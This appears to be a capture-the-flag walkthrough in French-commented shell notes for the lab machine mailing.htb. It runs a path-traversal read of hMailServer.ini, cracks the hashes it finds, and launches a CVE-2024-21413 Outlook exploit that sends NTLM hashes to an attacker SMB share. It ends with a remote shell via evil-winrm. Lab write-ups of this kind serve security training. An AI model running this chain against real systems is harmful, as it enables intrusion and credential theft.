# mailing
```shell
nmap -sV -sC 10.10.11.14
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-18 13:31 CEST
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.22% done; ETC: 13:32 (0:00:00 remaining)
Nmap scan report for 10.10.11.14
Host is up (0.071s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP UIDL USER
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: ACL QUOTA IMAP4rev1 IDLE completed NAMESPACE CHILDREN CAPABILITY OK SORT RIGHTS=texkA0001 IMAP4
445/tcp  open  microsoft-ds?
465/tcp  open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp  open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp  open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: ACL QUOTA IMAP4rev1 IDLE completed NAMESPACE CHILDREN CAPABILITY OK SORT RIGHTS=texkA0001 IMAP4
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MAILING
| Not valid before: 2024-03-13T14:39:03
|_Not valid after:  2024-09-12T14:39:03
|_ssl-date: 2024-05-18T11:32:54+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MAILING
|   NetBIOS_Domain_Name: MAILING
|   NetBIOS_Computer_Name: MAILING
|   DNS_Domain_Name: MAILING
|   DNS_Computer_Name: MAILING
|   Product_Version: 10.0.19041
|_  System_Time: 2024-05-18T11:32:13+00:00
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
# add mailing.htb a /etc/hosts
ffuf -u http://mailing.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -s

assets
Assets
instructions
# on va dans instructions, on find pdf, on le read, il dit que creds est user:password, on va tester 
# on find aussi username maya et ruy ainsi que gregory sur site web
# test password spraying 
# on check si liste user est valide 
smtp-user-enum mailing.htb 25 -U userlist -m RCPT
# on fuzz web avec extension .php
ffuf -u 'http://mailing.htb/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php
# on find un download.php, on fuzz parameter 
ffuf -u 'http://mailing.htb/download.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 31
# param file est good, on test LFI
ffuf -u 'http://mailing.htb/download.php?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 15
# find windows.ini on test avec curl 
curl 'http://mailing.htb/download.php?file=\..\..\WINDOWS\win.ini'
# good ca passe on a output, on try de find fichier interessant
# on find sur internet ou est locate le ;ini de hmail server et on recup info https://dannyda.com/2021/04/15/how-to-move-hmailserver-data-logs-temp-folder-to-another-location-disk-partition/
curl 'http://mailing.htb/download.php?file=..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini'
# on a hash dun password on test de le casser 
hashid hash -m 
# cest du md5
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
# on find le password homenetworkingadministrator
telnet mailing.htb 110
user administrator
pass homenetworkingadministrator
# read first email 
retr 1
# on find ref a cve sur outlook pour rce, on recup exploit https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
# on read write up sur cve pour comprendre puis on lauch exploit 
responder -I tun0
CVE-2024-21413.py --server "10.10.11.14" --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailing.htb" --recipient "administrator@mailing.htb" --url '\\10.10.16.47\share\tetst' --subject "test"
# on recup maya hash on le pete 
hashcat -m 5600 mayahash /usr/share/wordlists/rockyou.txt
# password de maya m4y4ngs4ri
# on test de rdp, on peut pas, on try winrm 
cme winrm 10.10.11.14 -u maya -p 'm4y4ngs4ri'
# good, on va use evilwinrm pour rce
evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
# good il faut rce maintenant



```
